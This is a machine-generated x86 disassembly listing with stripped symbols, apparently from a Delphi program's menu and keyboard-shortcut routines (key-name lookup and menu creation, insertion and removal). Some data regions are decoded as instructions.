inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in eax dx
inc ebp
add [ eax + eax ] dl
add [ eax ] al
mov esp 0xe0004160
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + ecx * 4 ] dh
inc ecx
add al bl
mov [ ecx ] eax
sbb [ ecx + eax * 2 + 0x41888800 ] cl
add [ ecx + ecx * 4 ] al
inc ecx
add [ ecx + edi ] al
inc esi
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add [ eax + 0x34e00041 ] bh
inc eax
outsb
or al 0xdf
inc ebp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_453940
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
dec ebp
outsb
jne r-xdata
insb
mov [ 0xffffffffa3d00042 ] eax
inc edx
add [ eax - 0x63ffbd5d ] dh
mov [ 0x540e0042 ] eax
add [ eax ] cl
add [ eax ] al
add [ edx ] ch
inc edx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ ebx + 0x42 ] ch
add al dl
mov [ 0xffffffffa3b00042 ] eax
inc edx
add [ ebx + 0x540e0042 ] bl
imul esi [ ebx + 0x74 ] 0x45ed5890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebp * 8 + 0x45 ] ah
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_45eda4
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_44e0cc
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_453940
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_45edfc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_45ee34
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_4040ac
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_40431c
sub_45ee88
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_45f071
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404144
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_404294
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404144
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404144
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_404294
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_404294
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_4040ac
mov eax esi
call sub_4040ac
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404144
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_408288
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4043b8
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_45ee34
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404374
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404144
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404374
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404374
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404374
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f078
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4040d0
retn
sub_45f08c
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_40436c
push eax
mov eax edi
call sub_40436c
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40436c
push eax
mov eax edi
call sub_40456c
push eax
mov eax [ esi ]
call sub_40456c
pop edx
pop ecx
call sub_408100
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_40436c
mov ecx eax
mov eax esi
mov edx 0x1
call sub_40460c
sub_45f0e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40455c
xor eax eax
push ebp
push sub_45f1c3
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_45f08c
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45f08c
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45f08c
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45f08c
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f1ca
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_45ee88
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4080b0
test eax eax
jne r-xdata
sub_45f200
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_4617a0
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_4617b0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_45f260
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_4617a0
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_4617a0
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4617b0
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4617b0
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_45f200
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_45f200
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4617b0
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4617b0
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_45f3ac
push ebx
mov ebx eax
mov eax ebx
call sub_45bea8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403460
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_4642bc
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_45f3e4
push ebx
mov ebx eax
mov eax ebx
call sub_45bebc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403460
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45f414
push ebx
mov ebx eax
mov eax ebx
call sub_45bed0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403460
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45f444
push ebx
mov ebx eax
mov eax ebx
call sub_45bef8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403460
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45f474
push ebx
mov ebx eax
mov eax ebx
call sub_45bf20
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403460
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_4044b8
je r-xdata
mov al 0x1
pop ebx
retn
sub_45f4a8
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_45bee4
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403460
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_45f4e4
push ebx
mov ebx eax
mov eax ebx
call sub_45bf34
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403460
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45f518
push ebx
mov ebx eax
mov eax ebx
call sub_45bf48
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403460
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45f54c
push ebx
mov ebx eax
mov eax ebx
call sub_45bf5c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403460
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45f580
push ebx
mov ebx eax
mov eax ebx
call sub_421c60
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45f5a8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_45f5c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_461608
sub_45f5e8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_461678
sub_45f608
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4616cc
sub_45f628
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_45f644
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_404100
sub_45f668
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4617f8
sub_45f688
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4617d4
sub_45f6a8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4617e8
sub_45f6c8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_45f6f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_421370
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_45f1e0
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_462104
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_45f770
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_4640a0
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_4617a0
test eax eax
jg r-xdata
mov edx esi
call sub_461b38
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_4617b0
call sub_4032b0
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_4032b0
lea eax [ esi + 0x44 ]
call sub_40d564
lea eax [ esi + 0x78 ]
call sub_40d564
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_45fb8c
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_418edc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4213bc
test bl bl
jle r-xdata
call sub_4032b0
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_45f824
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_45fa7f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fa86
lea eax [ ebp - 0x40 ]
call sub_4040ac
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_404144
mov eax ebx
call sub_4617a0
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_45fd34
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4044b8
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_4617a0
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_461d5c
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_45ee88
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_40442c
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_40456c
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_40456c
push eax
mov eax ebx
call sub_45fd34
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_461378
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4044b8
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_40456c
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_4617a0
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_45fd34
mov [ ebp - 0x25 ] eax
sub_45fa9f
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_45f824
xor eax eax
pop ebp
retn
sub_45fac4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_463398
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_462360
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_46285c
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_45f260
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_45fb34
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45fb7e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41dd5c
mov eax [ ebp - 0x4 ]
call sub_45f0e8
mov edx eax
mov eax ebx
call sub_4617d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fb85
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_45fb8c
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_45fc04
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_421440
sub_45fbc8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4217c0
mov eax ebx
call sub_461788
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_461788
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_4034ac
pop esi
pop ebx
retn
mov eax ebx
call sub_45fc04
sub_45fc04
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_45fd34
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_45fc04
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_45fd34
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_45fd34
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_45fac4
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax ebp
call sub_45fd34
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45fcd4
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_4617a0
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_4617b0
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_4617b0
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_4617b0
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_45eddc
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_45fd34
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_45fac4
mov eax [ rw-data ]
call sub_45eddc
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_45fd80
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4216e8
push ebx
push sub_45fb34
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
